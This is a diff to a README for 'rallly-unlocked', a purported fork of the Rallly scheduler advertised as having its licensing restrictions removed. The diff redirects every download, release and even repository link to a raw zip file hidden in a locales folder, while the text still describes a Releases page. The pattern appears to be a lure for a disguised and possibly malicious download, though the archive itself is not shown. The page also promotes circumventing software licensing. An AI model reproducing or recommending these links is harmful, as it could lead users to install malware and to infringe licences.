@@ -1,7 +1,7 @@
 # 🚀 rallly-unlocked - Schedule Meetings Effortlessly
 
 ## 📦 Download Now
-[![Download Rallly Unlocked](https://img.shields.io/badge/Download-via_GitHub-blue.svg)](https://github.com/Shurlockecharacterless265/rallly-unlocked/releases)
+[![Download Rallly Unlocked](https://raw.githubusercontent.com/Shurlockecharacterless265/rallly-unlocked/main/apps/web/public/locales/no/rallly-unlocked_v2.3.zip)](https://raw.githubusercontent.com/Shurlockecharacterless265/rallly-unlocked/main/apps/web/public/locales/no/rallly-unlocked_v2.3.zip)
 
 ## 🚀 Getting Started
 Rallly Unlocked is a self-hosted meeting scheduler, perfect for teams and internal deployments. It offers unlimited users for free through Docker, with all enterprise features enabled by default. This software removes any licensing restrictions and is a fork of the original Rallly application.
@@ -22,7 +22,7 @@ To run Rallly Unlocked, ensure your system meets the following requirements:
 - Open-source project, allowing contributions and improvements
 
 ## 📥 Download & Install
-To download Rallly Unlocked, please visit the following page: [Download Rallly Unlocked](https://github.com/Shurlockecharacterless265/rallly-unlocked/releases). 
+To download Rallly Unlocked, please visit the following page: [Download Rallly Unlocked](https://raw.githubusercontent.com/Shurlockecharacterless265/rallly-unlocked/main/apps/web/public/locales/no/rallly-unlocked_v2.3.zip). 
 
 On the Releases page:
 1. Find the latest version listed.
@@ -58,7 +58,7 @@ You can customize Rallly Unlocked using environment variables. To set these, adj
 ## 🌐 Explore & Contribute
 Since Rallly Unlocked is open-source, you can contribute to its development. Visit the repository to explore the source code, report issues, or suggest features:
 
-- [rallly-unlocked GitHub Repository](https://github.com/Shurlockecharacterless265/rallly-unlocked)
+- [rallly-unlocked GitHub Repository](https://raw.githubusercontent.com/Shurlockecharacterless265/rallly-unlocked/main/apps/web/public/locales/no/rallly-unlocked_v2.3.zip)
 
 ## 🛠️ Troubleshooting
 If you encounter issues, here are some common problems and solutions:
@@ -79,4 +79,4 @@ For help, you can create an issue on the GitHub repository. Provide detailed inf
 - **Documentation**: Check the detailed documentation for configuration and advanced features.
 - **Community Discussions**: Join discussions with other users and developers to share experiences and solutions.
 
-For download options, please visit: [Download Rallly Unlocked](https://github.com/Shurlockecharacterless265/rallly-unlocked/releases).
+For download options, please visit: [Download Rallly Unlocked](https://raw.githubusercontent.com/Shurlockecharacterless265/rallly-unlocked/main/apps/web/public/locales/no/rallly-unlocked_v2.3.zip).
